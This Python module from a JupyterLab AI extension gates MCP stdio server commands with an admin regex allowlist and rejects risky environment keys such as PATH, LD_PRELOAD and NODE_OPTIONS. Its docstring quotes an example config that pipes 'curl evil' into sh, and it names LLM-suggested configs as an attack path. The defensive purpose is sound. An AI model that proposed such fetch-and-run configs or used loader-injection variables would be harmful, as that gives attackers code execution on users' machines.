# Copyright (c) Mehmet Bektas <mbektasgh@outlook.com>

"""Admin-policy gate for MCP stdio commands.

MCP servers configured with a stdio transport are spawned as subprocesses
of the JupyterLab server user, with full filesystem and network reach.
The Claude CLI's ``mcp add`` and NBI's own ``mcp.json``-loaded servers
both accept an arbitrary ``command`` string from user input. Without an
admin gate, a social-engineered or LLM-suggested config like
``{"command": "sh", "args": ["-c", "curl evil|sh"]}`` lands as RCE the
next time the session starts.

This module provides an opt-in regex allowlist for the binary name plus
an env-key denylist that closes the most common PATH / LD_PRELOAD style
bypasses. The default state is permissive (empty list, no enforcement)
so existing per-user deployments keep working; regulated multi-tenant
deployments can pin the allowed binaries via traitlet or env.

Scope notes for future readers: the regex matches the literal ``command``
string only. ``args`` flow through unchecked. Admins who need stricter
argv control should pin the ``command`` to a wrapper script they own
that bakes the safe argv in. The in-process NBI tools (the ones declared
under ``built_in_toolsets``) are not MCP and go through a different
sandbox; this gate does not cover them.
"""

from __future__ import annotations

import re
from typing import Iterable, List, Mapping

# Env keys that can convert a name-only allowlist into a full RCE: a
# poisoned PATH resolves an "allowed" binary name to attacker-controlled
# code; preload variables inject a shared object into the spawned process
# before the binary's own entry point runs. Reject these at config time
# so the binary-name allowlist isn't a false sense of security.
DANGEROUS_MCP_ENV_KEYS: frozenset = frozenset(
    {
        "PATH",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
        "DYLD_FALLBACK_LIBRARY_PATH",
        "DYLD_FORCE_FLAT_NAMESPACE",
        "PYTHONPATH",
        "PYTHONSTARTUP",
        "PYTHONHOME",
        "NODE_OPTIONS",
        "NODE_PATH",
        "BASH_ENV",
        "ENV",
    }
)


def compile_allowlist(patterns: Iterable[str]) -> List[re.Pattern[str]]:
    """Compile each pattern, raising ValueError with a friendly message on a bad regex."""
    compiled: List[re.Pattern[str]] = []
    for pattern in patterns:
        try:
            compiled.append(re.compile(pattern))
        except re.error as exc:
            raise ValueError(
                f"Invalid regex in mcp_stdio_command_allowlist: {pattern!r}: {exc}"
            ) from exc
    return compiled


def validate_mcp_stdio_command(command: str, allowlist: Iterable[str]) -> None:
    """Raise ``ValueError`` when the allowlist is non-empty and ``command`` matches no pattern.

    Empty allowlist means no enforcement, which is the default behavior.
    The match is ``re.search``; admins should anchor patterns (``^x$``)
    when they want literal-binary semantics. Patterns matching anywhere
    in the string ("``uv``" matches "``uvtool``") are a footgun the
    helper does not autocorrect.
    """
    patterns = list(allowlist)
    if not patterns:
        return
    if not isinstance(command, str) or not command:
        raise ValueError("MCP stdio command must be a non-empty string")
    compiled = compile_allowlist(patterns)
    if not any(p.search(command) for p in compiled):
        raise ValueError(
            f"MCP stdio command {command!r} is not in the admin allowlist; "
            "set NotebookIntelligence.mcp_stdio_command_allowlist or "
            "NBI_MCP_STDIO_COMMAND_ALLOWLIST to permit it."
        )


def reject_dangerous_env_keys(env: Mapping[str, str] | None) -> None:
    """Raise ``ValueError`` when ``env`` contains a key from ``DANGEROUS_MCP_ENV_KEYS``.

    Empty/None env passes silently. The check is case-insensitive on the
    Unix-like keys (POSIX env names are case-sensitive in practice but
    the dynamic loader honors a few variants in surprising ways, and the
    cost of being case-insensitive here is zero).
    """
    if not env:
        return
    for key in env:
        if not isinstance(key, str):
            continue
        # Normalize before comparing: strip whitespace and uppercase, so
        # smuggling via " PATH" / "path\t" is caught the same way as
        # "PATH". POSIX env names are technically case-sensitive in
        # execve, but the dynamic loader honors a few variants in
        # surprising ways and a leading space is the simplest bypass
        # of a case-only check.
        normalized = key.strip().upper()
        if normalized in DANGEROUS_MCP_ENV_KEYS:
            raise ValueError(
                f"MCP env key {key!r} is not permitted; setting "
                f"{normalized} would bypass the stdio command allowlist."
            )
